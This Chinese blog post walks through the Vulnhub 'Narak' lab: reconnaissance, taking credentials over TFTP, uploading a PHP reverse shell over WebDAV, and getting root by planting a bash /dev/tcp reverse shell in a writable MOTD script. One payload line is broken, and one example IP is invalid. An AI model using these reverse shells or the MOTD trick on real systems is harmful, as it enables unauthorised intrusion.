---
title: vulnhub-Narak通关记录
date: 2023-04-18 21:54:56
tags: 
- vulnhub
- Narak
- WriteUp
categories: WriteUp
keywords: vulnhub
description: 本文记录了作者在通关vulnhub靶机Narak中遇到的问题以及踩坑后的解决方案。涉及TFTP信息泄漏，webdav反弹shell上传。二级提权，第一级通过找到可写bash脚本文件中的brainfuck语句，获得凭据，二级通过motd脚本获得root权限。
top_img: https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg
cover: https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg
---


## 信息搜集

### Nmap扫描

将靶机导入 VM ，然后用侦测靶机 IP 地址

``` bash
sudo nmap -sn --min-rate 10000 192.168.xxx.0/24
```

这段命令的含义是：

`-sn` 不进行端口扫描，只进行主机发现，即判断目标网段中哪些主机是存活的，
`–min-rate 10000` 设置扫描的最小速率为10000个数据包每秒，可以提高扫描效率，但也可能导致丢包或误报。
`192.168.xxx.0/24` 指定目标网段为192.168.xxx.0/24，即192.168.xxx.0到192.168.xxx.255共256个IP地址。

靶机打开前后进行两次扫描，从而可以通过对比确定靶机地址。

``` bash
┌──(kali㉿kali)-[~/Desktop/BoxWalk/Vulnhub/HA-Narak]
└─$ sudo nmap -sn --min-rate 10000 192.168.xxx.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 05:20 EDT
Nmap scan report for 192.168.xxx.1
Host is up (0.0031s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.xxx.2
Host is up (0.00017s latency).
MAC Address: 00:50:56:FA:6C:6F (VMware)
Nmap scan report for 192.168.xxx.132
Host is up (0.00029s latency).
MAC Address: 00:0C:29:60:A2:BC (VMware)
Nmap scan report for 192.168.xxx.254
Host is up (0.00015s latency).
MAC Address: 00:50:56:FB:CA:55 (VMware)
Nmap scan report for 192.168.xxx.130
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 0.62 seconds
```

确定靶机`192.168.xxx.132`之后，对靶机进行探测：

``` bash
sudo nmap -sT -p- --min-rate 10000 192.168.xxx.132
```

该命令的含义是：

`-sT`：使用 TCP connect 扫描，即完成TCP的三次握手阶段进行扫描，可以判断目标主机开放了哪些端口。
`-p-`：指定扫描所有端口，即从1到65535共65535个端口，这样可以避免遗漏一些不常见的端口。

``` bash
sudo nmap -sT -sV -sC -v -O -p22,80 --min-rate 10000 192.168.xxx.132 -oA narakDetails
```

扫描结果如下：

![扫描结果](https://pic.imgdb.cn/item/647c13a8f024cca173274bbd.png)


该命令的含义是：

`-sV` ：探测目标主机开放端口的服务版本信息，可以获取更多的细节，如软件名称、版本号等。
`-sC` ：使用默认的Nmap Scripting Engine (NSE)脚本进行扫描，可以执行一些常见的安全检测和漏洞利用等。
`-v` ：增加输出的详细程度，显示更多的运行时信息和警告。
`-O` ：尝试探测目标主机的操作系统类型和版本，需要有root权限才能执行。
`-p22,80` ：指定只扫描22和80两个端口，可以节省时间和资源。
`-oA narakDetails` ：指定输出结果的格式为三种（普通、XML、grepable）并保存到以narakDetails为前缀的文件中。

扫描结果如下：

![扫描结果](https://pic.imgdb.cn/item/64b2d7241ddac507cc2fcbca.jpg)

接着用UDP协议进行探测：

``` bash
sudo nmap -sU --top-port 20 --min-rate 10000 192.168.xxx.132
```

该命令的含义是：

`-sU` ：使用UDP扫描，即发送UDP数据包到目标主机的端口，根据响应判断端口是否开放。
`--top-port 20` ：指定扫描最常见的20个端口，可以节省时间和资源。

扫描结果如图所示：

![UDP扫描结果](https://pic.imgdb.cn/item/647c13a9f024cca173274d06.png)

从 UDP 扫描结果可以发现，靶机似乎存在 TFTP 服务<sup>[①](#TFTP-获取关键文件)</sup>，但是目前没有利用点，继续向下走。


### gobuster 爆破目录

之后用 gobuster 爆破目录，字典用的 dirbuster 带的字典，~~属实是NTR了。~~

``` shell
sudo gobuster dir -u 192.168.xxx.132 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![gobuster爆破结果](https://pic.imgdb.cn/item/647c13a8f024cca173274c1e.png)

### webdav上传shell

发现 webdav 服务，`http://192.168.xxx.132/webdav`

![Webdav服务](https://pic.imgdb.cn/item/647c13a8f024cca173274c85.png)


{% note danger %}
注意：gobuster 默认不扫描 `zip` , `rar` , `sql` , `txt` 文件，因此需要用 `-x` 参数指定
{% endnote %}

``` bash
sudo gobuster dir -u 192.168.118.132 -x zip,rar,sql,txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

又发现 `http://192.168.xxx.132/tips.txt` ，提示为：“Hint to open the door of narak can be found in creds.txt.”

尝试访问一下：`http://192.168.xxx.132/creds.txt` ，然而并没能请求到该文件，说明这条路走不通。

接下来试试前文提到的 TFTP 服务：

``` bash
tftp 192.168.xxx.132
get creds.txt
```

欸，居然成功了。打开文件观察一下，发现是 base64 编码的，解码后返回一对账号密码：

![账号密码](https://pic.imgdb.cn/item/647c13a9f024cca173274d2e.png)

登录 Webdav ，结果发现没有任何可利用的文件，想到能不能写入文件，从 kali 的工具手册找到 Devtest 工具。

>DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable.

`Devtest` 这个工具就是用来测试 WebDAV 有哪些文件允许上传，并且能够上传 shell 文件。

``` bash
sudo davtest -auth yamdoot:Swarg -cleanup -url http://192.168.118.132/webdav
```

测试结果如下：

![davtest 测试结果](https://pic.imgdb.cn/item/647c13a9f024cca173274e08.png)

可以看到，php文件师是能够执行的，这里可以直接写入 webshell 用工具连接，也可以写入一句话反弹 shell 。此处选择后者：

``` php
<?php exec("\bin\bash -c 'bash -i >& /dev/tcp/192.168.xxx.130/ 0>&1'");?>
```


>cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking.
>
>Its operation is similar to the standard BSD ftp(1) client and the Samba Project’s smbclient(1).
>
>This package includes GnuTLS (HTTPS) support.
>
>WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.

`cadaver` 是一个可以用来访问和编辑web服务器上的文件的工具，kali 系统中默认装有此软件，因此用 cadaver 通过之前活得的用户名与密码，写入 `shell.php` 上传，使用 nc 监听端口<sup>[②](#nc参数含义)</sup>，然后请求 `http://192.168.xxx.132/webdav/shell.php`：

``` bash
echo "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.xxx.130/2333 0>&1'");?>" > shell.php
cadaver http://192.168.xxx.132/webdav # then enter User ID and passwd
put /path/to/shell.php
nc -lvnp 2333
```

可以看到已经回弹 shell 了，是 `www-data` 用户

```
┌──(kali㉿kali)-[~/Desktop/BoxWalk/Vulnhub/HA-Narak]
└─$ nc -lvnp 2333
listening on [any] 2333 ...
connect to [192.168.xxx.130] from (UNKNOWN) [192.168.xxx.132] 56482
bash: cannot set terminal process group (590): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/webdav$  
```

## 提权

### find命令查找可写文件

通过 `find` 命令，寻找可写文件

``` bash
find / -writable -type f 2>/dev/null
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null 
```

结果如下：

![提权1](https://pic.imgdb.cn/item/647c13a9f024cca173274e70.png)

首先查看 `/mnt/hell.sh` 文件，通过查询资料发现是 Brainfuck 加密<sup>[③](#Brainfuck-加密)</sup>。

```
www-data@ubuntu:/var/www/webdav$ cat /mnt/hell.sh
cat /mnt/hell.sh
#!/bin/bash

echo"Highway to Hell";
--[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.
```

使用 kali 自带的 beef 软件解密，结果如下：

```
┌──(kali㉿kali)-[~/Desktop/BoxWalk/Vulnhub/HA-Narak]
└─$ beef highway.bf
chitragupt    
```

>Beef is a flexible interpreter for the Brainfuck programming language.
It  can  be configured using the options described below, making it possible to run Brainfuck programs that make assumptions about the behavior of the interpreter.
Beef sets no arbitrary limit to the size of the memory tape used by the program, and allocates memory cells as they are needed.

~~在这卡了很久，还是打靶太少了。~~

最后猜测这应该是一个用户的密码，于是通过 `cat /etc/passwd` 的方式查看机器中有哪些用户：

```
www-data@ubuntu:/var/www/webdav$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
narak:x:1000:1000:narak,,,:/home/narak:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
yamdoot:x:1001:1001:,,,:/home/yamdoot:/bin/bash
inferno:x:1002:1002:,,,:/home/inferno:/bin/bash
```

可以看到， `narak` 用户的 GECOS 字段中的逗号后面的文本是 `,,,` ，表示没有提供有关该用户的额外信息或描述。同样地， `yamdoot` 和 `inferno` 用户的 GECOS 字段中的逗号后面的文本也表示没有提供额外信息。

因此猜测这三个账号是我们所需要尝试的账号。

### ssh登录普通权限

尝试之后，成功登入inferno账户：

```
┌──(kali㉿kali)-[~/Desktop/BoxWalk/Vulnhub/HA-Narak]
└─$ ssh inferno@192.168.xxx.132                                                 
inferno@192.168.xxx.132's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

inferno@ubuntu:~$ 
```

实际上到这已经没思路了，于是翻看了一下大师傅的 WriteUp 视频，发现大师傅是通过 MOTD 来进行提权的<sup>[④](#motd-介绍 )</sup>。

```
inferno@ubuntu:~$ ll /etc/update-motd.d/
total 36
drwxrwxrwx  2 root root 4096 Sep 21  2020 ./                                                                                                                 
drwxr-xr-x 80 root root 4096 Sep 22  2020 ../                                                                                                                
-rwxrwxrwx  1 root root 1220 Apr  9  2018 00-header*
-rwxrwxrwx  1 root root 1157 Apr  9  2018 10-help-text*
-rwxrwxrwx  1 root root 4251 Apr  9  2018 50-motd-news*
-rwxrwxrwx  1 root root  604 Mar 21  2018 80-esm*
-rwxrwxrwx  1 root root 3017 Mar 21  2018 80-livepatch*
-rwxrwxrwx  1 root root  299 May 18  2017 91-release-upgrade*
```

根据注释，可以知道 MOTD 是动态生成的，所以我们直接进入 `/etc/update-motd.d/` 目录，在 `00-header` 文件中添加反弹 shell ：

``` bash
bash -c "bash -i >& /dev/tcp/192.168.118.130/2333 0>&1"
```

nc 监听，成功反弹：

```
┌──(kali㉿kali)-[~/Desktop/BoxWalk/Vulnhub/HA-Narak]
└─$ nc -lvnp 2333 
listening on [any] 2333 ...
connect to [192.168.118.130] from (UNKNOWN) [192.168.118.132] 56488
bash: cannot set terminal process group (11762): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/# cd root
cd root
root@ubuntu:/root# cat ./root.txt
cat ./root.txt
██████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█
█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█
█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█
█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███
█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███
█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█
█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█
█░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█
██████████████████████████████████████████████████████████████████████████████████████████
                           
                                                                                    
Root Flag: {9440aee508b6215995219c58c8ba4b45}

!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/hackinarticles

Jeenali Kothari  : https://www.linkedin.com/in/jeenali-kothari/

+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
__________________________________
```

## 总结

这个靶机是作者第一台 Vulnhub 靶机，主要收获如下：

1. 熟悉了一个比较完整的渗透流程，特别是信息收集环节的一些思路。比如，怎样端口信息的收集和判断，怎样处理 web 信息以及寻找对应的漏洞；
2. 了解 Webdav 、TFTP 服务的基本知识，至少以后遇到有个初步印象；
3. 了解提权的一些基本手法，通过权限查找所需信息、 motd 提权；

## 参考文献

[「红队笔记」靶机精讲：Narak](https://www.bilibili.com/video/BV1R84y1w7MK/?vd_source=a8f71b037b12c218162155c04e3741e1)

## 注释

### TFTP 获取关键文件

TFTP 是**简单文件传输协议**（Trivial File Transfer Protocol）的缩写，它是一种用来在客户机和服务器之间进行简单文件传输的协议。它提供不复杂、开销不大的文件传输服务，使用 UDP 协议在端口号69建立网络连接。它的一个主要用途是在局域网中的节点启动时进行文件传输。TFTP 不需要用户登录，也不支持重命名或删除文件。TFTP 通常只适用于局域网使用，因为它没有安全或保密机制。

使用 TFTP 传输文件需要有一个 TFTP 客户端和一个 TFTP 服务器。TFTP 客户端可以用命令行或图形界面的方式操作，TFTP 服务器需要安装和配置相应的软件。不同的操作系统有不同的方法，这里以 Linux 和 Windows 为例。

在 Linux 系统中，可以使用 tftp 命令来传输文件。tftp 命令的语法是：

``` bash
tftp [主机名称或IP地址]
```

例如，要连接到远程服务器218.28.188.288，可以输入：

``` bash
tftp 218.28.188.288
```

连接成功后，可以使用以下命令来传输文件：

- put：上传文件到服务器
- get：从服务器下载文件
- quit：退出tftp
- help：显示帮助信息

例如，要从服务器下载根目录下的文件README，可以输入：

```
get README
```

在 Windows 系统中，需要先开启TFTP客户端的功能，方法是：

- 打开控制台，点击应用程序。
- 在“应用程序与功能”窗口，往下滑到底部点击“程序和功能->开启与关闭Windows功能”。
- 在“Windows功能”窗口中，勾选“TFTP客户端”，可能需要重新启动电脑才能完成设置。

开启后，可以在命令提示符中输入tftp命令来传输文件。tftp 命令的语法是：

``` bash
tftp -p -l 本地文件路径 服务器IP地址（上传文件）
tftp -g -r 服务器文件路径 服务器IP地址（下载文件）
```

例如，要上传本地文件 `c:\\User\\Administrator\\Download` 到服务器 `1.2.3.4` ，可以输入：

``` bash
tftp -p -l c:\\User\\Administrator\\Download 1.2.3.4
```

要从服务器下载文件data.txt到当前目录，可以输入：

``` bash
tftp -g -r data.txt 1.2.3.4
```

### Webdav 服务

Webdav 服务是一种基于 HTTP 协议的文件共享服务，它可以让应用程序直接对 Web 服务器进行读写操作，并支持文件的锁定和版本控制。Webdav 服务的应用场景有：

- 在不同的设备和平台上同步和备份文件，如使用坚果云、 OneDrive 等支持 Webdav 协议的网盘。
- 在移动端访问和编辑云端的文档、笔记、日程等，如使用 iWork、GoodReader 、Notability 等支持 Webdav 协议的应用。
- 在远程服务器上管理和传输文件，如使用 RaiDrive 、WinSCP 等支持 Webdav 协议的工具。

要使用 Webdav 服务，需要有一个 Webdav 客户端和一个 Webdav 服务器。 Webdav 客户端可以是浏览器、文件管理器、应用程序等，Webdav 服务器可以是网盘、NAS 、VPS 等。要建立连接，需要知道服务器的**地址、端口、用户名和密码**。连接成功后，就可以像操作本地文件一样操作远程文件了。

要搭建一个 Webdav 服务器，可以使用 Windows 自带的 IIS 服务，也可以使用 Apache 、Nginx 等开源软件，或者使用专门的 Webdav 软件。

webdav服务漏洞是指一些利用webdav服务的特性或者缺陷来进行攻击的漏洞。webdav是一种基于HTTP协议的文件管理协议，允许用户通过web服务器来创建、修改、删除和移动文件。webdav服务漏洞的类型和影响有：

- webdav 目录遍历漏洞：利用 webdav 服务对 URL 解码的不完整性，可以绕过目录限制，访问或者修改任意文件，甚至执行任意代码。
- webdav PUT 方法漏洞：利用 webdav 服务支持的 PUT 方法，可以上传任意文件到 web 服务器上，如果没有正确的权限控制和过滤，可能导致任意代码执行或者信息泄露。
- webdav PROPFIND 方法漏洞：利用 webdav 服务支持的 PROPFIND 方法，可以获取 web 服务器上的文件和目录信息，如果没有正确的权限控制和过滤，可能导致信息泄露或者拒绝服务。
- webdav NTLM 认证绕过漏洞：利用 webdav 服务对 NTLM 认证的不正确处理，可以绕过身份验证，访问或者修改受保护的资源。

### nc参数含义

反弹shell中经常回用到netcat这个工具，以下是`-lvnp`参数的含义：

`-l` ：表示监听模式，使 nc 在指定的端口上监听传入连接。
`-v` ：表示详细模式（verbose mode），它会显示更多关于连接的信息，例如连接的来源等。
`-n` ：表示禁用主机名解析，这意味着 nc 不会尝试将 IP 地址解析为主机名。
`-p` ：后面跟着端口号，表示要监听的端口号。

### Brainfuck 加密

Brainfuck 是一种极简的编程语言，它由一系列简单的指令组成，用于操作一个字节大小的内存单元。由于其简单性，Brainfuck 并不是一个特别适合用于加密的编程语言。然而，你可以使用 Brainfuck 来进行简单的加密操作。

在 Brainfuck 中，你可以编写一段程序来对文本进行加密。加密的基本思想是通过改变字符的 ASCII 值来隐藏原始文本。你可以使用一系列的加减操作来修改字符的 ASCII 值，并将加密后的结果输出。

解密过程是加密过程的逆操作。通过对加密后的文本进行逆向的加减操作，你可以还原出原始的文本。

然而，需要注意的是，Brainfuck加密非常简单，容易被破解。这种加密方式主要用于学习和娱乐目的，而不是用于实际的安全通信。如果你需要更强大和安全的加密算法，请使用专门的加密库或算法，如AES或RSA。

### motd 介绍 

在 Linux 中，MOTD（Message of the Day）是指在用户登录系统时显示的一条信息或欢迎消息。 MOTD 通常用于向用户提供系统公告、警告、重要通知或其他相关信息。

MOTD 消息通常存储在一个文件中，可以通过编辑该文件来自定义 MOTD 内容。在大多数 Linux 发行版中， MOTD 文件的位置是 `/etc/motd` 。在打开的 MOTD 文件中，可以输入自定义的欢迎消息或其他所需的信息。保存并关闭文件后，新的 MOTD 将在下次用户登录时显示。

某些 Linux 发行版可能还有其他方式来管理 MOTD ，例如使用 `/etc/update-motd.d/` 目录中的脚本来生成 MOTD 。这些脚本可以在每次用户登录时**动态**生成 MOTD 消息。

无论使用哪种方法， MOTD 提供了一种在用户登录系统时向其显示重要信息的方式，以便提供必要的通知和提示。
